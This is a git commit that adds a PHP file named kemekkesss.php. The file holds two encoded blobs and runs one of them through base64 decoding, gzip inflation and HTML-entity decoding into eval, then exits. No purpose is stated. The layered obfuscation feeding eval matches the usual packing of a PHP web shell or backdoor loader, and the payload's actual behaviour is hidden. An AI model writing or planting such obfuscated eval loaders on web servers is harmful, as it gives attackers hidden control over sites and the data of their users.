d7d1272de4e3bfdd75e43da4502e709faee643da
mangoleh098 <jatinainggolan119@gmail.com>
2025-04-24 04:00:15 +0700

    Create kemekkesss.php

---
+++ kemekkesss.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "=UB0pIEdJ/PaCUvtXYaeYej+nbWCjst9TroJVuE+OGtkDZ0DJqD+vh+QSnU9v0Ep+TuOqU/xTarz+mspINrwM2zXeJ11svr5bbS49rQi9z62xNDzEtMttNNirWukBDiP9lEtX5q02N8jcpxAELRHwNnKHgzRMWzIs8lHc6krh3xhdyxLMBur92rjb2TbcuK/cz+aQHoQVGT2wyBYh6t8295s6RwZS+uG3m4UUpQscc4QZJHkV1fUo6xw84uJnlK57fiXHep0k+bDRd650nl4twRXFP/xl9P+gh2eeoG75PYgmtP+xd3lDNdNyV6kb71aoTnOfX3AofeQ62zEE9h+ylpuA3MUrXrVsaPGo0OyVMIptIre+E/UexdRTwJK9AdKxQVEi2KsjaAvggKecWhk1WAcpI2UEBU5pE84nRrVIsNbnkzH/SP6nFy4FaBWkD0HCNjhK1Ee1pcDwFcMtV6NtEj+O9+d75N4E+wWGAV3tp09+T54OtVGigajPbpQvIecluuX4+zm2QoN2CBLcnETHAWJQ8H8u1PEws9ahJVjcin/kFwmBwJe+nVAmGg/UFwqB4/TBAbA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
